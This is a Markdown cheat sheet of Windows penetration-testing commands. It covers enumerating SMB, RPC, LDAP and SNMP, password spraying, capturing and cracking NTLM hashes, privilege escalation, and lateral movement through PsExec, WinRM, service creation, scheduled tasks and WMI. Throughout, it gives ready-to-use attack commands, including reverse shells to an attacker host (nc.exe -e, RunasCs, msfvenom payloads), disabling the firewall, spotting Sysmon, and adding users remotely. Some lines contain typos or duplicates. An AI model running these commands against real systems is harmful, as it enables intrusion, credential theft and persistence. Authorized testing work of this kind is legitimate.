---
title: Windows pentesting notes
---

## Important directories
```powershell
%SystemDrive%\inetpub\                      # IIS data and sites
c:/WINDOWS/system32/drivers/etc/services    # List of services and ports
```

## MSRPC
MSRPC can be used to enumerate internal OS information.

**Automatic enumeration**
```powershell
enum4linux -a <ip> -u <user> -p <pass>      # Enumerate all info
```

**Manual enumeration**
```powershell
rpcclient -U "" <ip>                        # Login anonymously
rpcclient -U "<DOMAIN>\\<user>" <ip>        # Login with credentials
> ?                                         # List all commands
> srvinfo                                   # Server info
> enumdomusers                              # Enum users
> enumdomgroups                             # Enum groups
> enumdomains                               # Enum domains
> enumprivs                                 # Enum privileges
> netshareenumall                           # Enum net shares
> queryuser <user-name>                     # Detailed user's info
> lookupnames <user-name>                   # Get SID of user
> querygroup <group-rid>                    # Get group info
> getusername                               # Get current username
```

## SMB (139, 445)
SMB can be used to enumerate OS info (domain, NetBIOS, forest)

**Enumeration**
```powershell
nmap -p 445 --script=smb-os-discovery <ip>
nbtscan <ip>                                
nmblookup -A <ip> 

# List shares using credentials
crackmapexec smb <ip> -u <user> -p <pass> --shares

# Shares enumeration
smbclient -L //ip>
smbmap -H <ip>
```

**Password spraying**
```powershell
crackmapexec smb <ip> -u <user-file> -p <pass-file> --continue-on-success
```

**Connection / shell**
```powershell
# Connect to share by credentials
smbclient //ip>/<share> [-U "<DOMAIN>\\<user>%<pass>"]
> get <file>                                # Get file
> put <local-file>                          # Upload file
> exit                                      # Exit

# Connect and execute command at once
smbclient [...] -c "<smb-command>"

# GUI connection (and standard terminal further)
xdg-open smb://<ip>/<share>

# Try to get shell via SMB
impacket-smbexec <domain>/<user>[:password]@<ip>
```

**Exploits**
- EternalBlue MS17-010

## Kerberos
```powershell
    # Kerberos can be used to enumerate info and bruteforce passwords
    kerbrute username -d <domain> --dc <dc-ip> <wordlist-file>

    # Grab Kerberos hash
    impacket-netview <domain/username> -no-pass
```

## WinRM
```powershell
    evil-winrm -i <ip> -u <username> -H <hash>  # Login by hash
    evil-winrm -i <ip> -u <username> -p <pass>  # Login by password
```

## NTLM
```powershell
responder -I <iface> -dw                    # Sniff NTLM auth attempt
hashcat -m 5600 <hash-file> <wordlist>      # Crack NTLMv1 hash
hashcat -m 5600 <hash-file> <wordlist>      # Crack NTLMv2 hash
```

**NTLM hash stealing**
- https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds

Places and tricks to steal NTLM hashes The trick is to force victim server to
auth attempt with attacker host. Places to check:
- `desktop.ini` - can contain `//<my-ip>/` OR `\\<my-ip>\` line; often available
  on SMB shares.

## LDAP
```powershell
responder -I <iface> -dw                    # Sniff LDAP auth attempt
```

## WMI
```powershell
# Try to get shell via WMI
impacket-wmiexec <domain>/<user>[:password]@<ip>
```

## IIS
TBD

## FTP
TBD

## PXE boot image
Powershell script for extracting interesting data:
- https://github.com/wavestone-cdt/powerpxe

## Reconnaissance
### NFS
```bash
showmount -e <ip>                           # List NFS shares
mount -t nfs <ip>:/<share> <dest-dir>       # Mount NFS share
```

### NetBIOS
**Scanning**
```bash
nmblookup -A <ip>
nbtscan <ip>/<mask-bits>
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>
```

### SNMP
`public` is common default "public string" for SNMP service.
```powershell
snmp-check <ip> -c <pub-string>             # Nice-looking enumeration      
snmpwalk -v <ver> -c <pub-string> <ip> -m + # Enumerate MIB data
[...] NET-SNMP-EXTEND-MBI::nsExtendObjects  # Detect SNMP extend
```

### LDAP
```powershell
# Enumerate AD objects anonymously
ldapsearch ldap://<ip>:<port> -s base -b '' "(objectClass=*)" "*" + #

# Try to connect to LDAP
ldapsearch -x -H ldap://<ip>:<port> -D "<DOMAIN>\\<user>" -w <pass>
```

## Post-exploitation
### Port-forwarding

**Chisel**
To make localhost port accessible (local server port) from outside (attacker
host) use `chisel` port-forwarding tool: https://github.com/jpillora/chisel
```powershell
# 1. Run on Linux attacker host:
chisel server --reverse --port 9001
# 2. Run on Windows server (forward :win-port to :open-port):
.\chisel.exe client <my-ip>:9001 R:<open-port>:127.0.0.1:<win-port>
# 3. Now open in browser: http://localhost:<open-port>
```

### CMD and Powershell
- https://ss64.com/ - powershell and CMD commands cheat-sheet
```powershell
nc.exe -e powershell <my-ip> <my-port>      # Connect shell to listener

# Download file (tip: check file integrity)
Invoke-WebRequest -URI <url> -OutFile <file>

Get-FileHash <file> -Algorithm MD5          # Calculate MD5 file hash
gci env:* | sort-object name                # List env variables

get-localuser                               # List all local users
Get-NetAdapter -Name * -IncludeHidden       # List all network adapters
ipconfig /all                               # Show network configuration
net share                                   # List local SMB shares
net view \\<machine> /all                   # List remote SMB shares
net start                                   # List services
net user                                    # List all local users
net user <username>                         # Get info about local user
net localgroup                              # List all local groups   
net localgroup <group>                      # Get info about local group
net accounts                                # List local password policy
netstat -avb -p <TCP|UDP>                   # List open ports
arp -a                                      # List ARP table (discover hosts)
tasklist                                    # List processes
systeminfo                                  # Get local system and AD info
get-service WinDefend                       # Get state of Windows Defender
Get-MpComputerStatus                        # Get status of AV software
Get-MpThreat                                # Get details of detected threat
Get-NetFirewallProfile                      # List profiles of local firewall
Get-NetFirewallRule                         # List rules of local firewall
req query <registry-key>                    # Get Windows registry key value

# Find TCP port by service PID
netstat -noa | findstr "LISTENING" | findstr <PID>
netstat
  -a                                        # List listening ports only
  -b                                        # Show assigned binary
  -n                                        # Do not resolve IP
  -o                                        # Show PID

# Get event logs
Get-EventLog -List        
Get-EventLog -LogName System -EntryType Error      

# Disable firewall profiles
Set-NetFirewallProfile -Profile Domain,Public,Privarte - Enabled False

# Test for connections to other machines
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
(New-Object System.Net.Sockets.TcpClient("127.0.0.1", "80")).Connected

# Sysmon detection tricks
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

```

### Active Directory information gathering
**CMD**
```powershell
net user /domain                            # List all AD users
net user <username> /domain                 # Get info about AD user
net group /domain                           # List all AD groups
net group <group> /domain                   # Get info about AD group
net accounts /domain                        # Get AD password policy
systeminfo | findstr Domain                 # Get AD domain name
```

**Powershell**
```powershell
# IMPORTANT: `import-module ActiveDirectory` might be required.
get-aduser -filter * <user>                 # User info
get-adgroup <group>                         # Group info
get-adforest                                # Active forest info
get-addomain -server <DC>                   # Get info about current AD domain

# Get full info about AD user
get-aduser -identity <username> -server <DC> -properties *

# Get AD users by Distinguished Name
get-aduser -filter * -searchbase <DN>

# Get full info about AD group
get-adgroup -identity <group> -server <DC> -properties *
```

### Privilege escalation
**Weakness discovering**
- https://github.com/GhostPack/Seatbelt - Windows security enumeration script
```powershell
whoami /priv                                # List privileges of user
whoami /groups                              # List groups of user
winpeas.exe                                 # Enumerate potential findings
```

**Run command as a different user** (with AD credentials)
There are some commands that don't have option to specify domain credentials with them. The workaround of this problem is to start new local shell using target domain account and run the mentioned commands as target user. There is

Windows has a built-in `runas.exe` binary. It allows to run any command as a different user. This command doesn't authenticate credentials against a DC (they are only injected into memory). The `/netonly` flag makes credentials to be used everywhere to domain authentication. Sometimes the binary might not be present on a real server.
```powershell
runas.exe /netonly /user:<domain>\<username> "<command>"

# We have to check if the credentials work. Every AD account
# (even with the lowest privileges) has access to the SYSVOL folder.
dir \\<FQDN>\SYSVOL\                        # Using Kerberos auth
dir \\<IP>\SYSVOL\                          # Using NTLM auth
```

There are other non-default tools:
- https://github.com/antonioCoco/JuicyPotatoNG - local priv-escalation tool
- https://github.com/antonioCoco/RunasCs - tool to open shell connection as a different user
```powershell
.\runascs.exe -d <domain> <user> <pass> cmd.exe -r <my-ip>:<my-port>
```

### Lateral movement
Execute process remotely using captured credentials.

#### PsExec tool
```powershell
psexec64.exe \\<target-ip> -u <user> -p <password> -i "cmd.exe"
```

#### WinRM protocol
Quick method:
```powershell
winrs.exe -u:<user> -p:<password> -r:<target-ip> "cmd.exe"
```

Pure PowerShell method:
```powershell
$username = '<user>';
$password = '<password>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername <target-ip> -Credential $credential
Invoke-Command -Computername <target-ip> -Credential $credential -ScriptBlock {whoami}
```

#### Service command execution (SC tool)
> NOTE: The victim's OS is in charge of starting the service, you won't be able to look at the command output.

```bash
# Generate service campatible (exe-service) reverse shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker-ip> LPORT=<attacker-port> -o <output-name.exe>
```

> NOTE: `sc.exe ` doesn't allow to specify credentials as a part of the command so it might be necessary to start new shell (with another account) using `runas` command.

```powershell
# Start new shell

# Execute command - create a user
sc.exe \\<target-ip> create <service> binPath= "net user <user> <pass> /add" start= auto
sc.exe \\<target-ip> start <service>

# Stop service
sc.exe \\<target-ip> stop <service>
sc.exe \\<target-ip> delete <service>
```

#### Scheduled tasks command execution (schtasks tool)
> NOTE: The victim's OS is in charge of running the scheduled task, you won't be able to look at the command output.

```powershell
# Create a task
schtasks /s <target-ip> /RU <user> /create /tn <task-name> /tr <command> /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the task
schtasks /s <target-ip> /run /TN <task-name> 

# Stop the task
schtasks /S <target-ip> /TN <task-name> /DELETE /F
```

#### Abusing WMI
**Establishing WMI session**
```powershell
$Username = "<target-user>";
$Password = "<target-pass>";
$TargetHost = "<target-ip>";

# Create PSCredential object
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $TargetHost -Credential $Credential -SessionOption $Opt -ErrorAction Stop
```

**Command execution (blind)**
```powershell
# Execute a command remotely (blind)
$Command = "<cmd-payload>"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

**Service creation (blind)**
```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

**Scheduled task creation (blind)**
```powershell
$Command = "<cmd-payload>"
$Args = "<payload-args>"
$TaskName = "<task-name>"

# Run a task
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName $TaskName
Start-ScheduledTask -CimSession $Session -TaskName $TaskName

# Stop the task
Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
```

**Installing MSI packages**
```powershell
# Generate MSI reverse shell payload 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4443 -f msi > "<package-name.msi>"

# Install MSI payload
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package-path.msi>"; Options = ""; AllUsers = $false}
```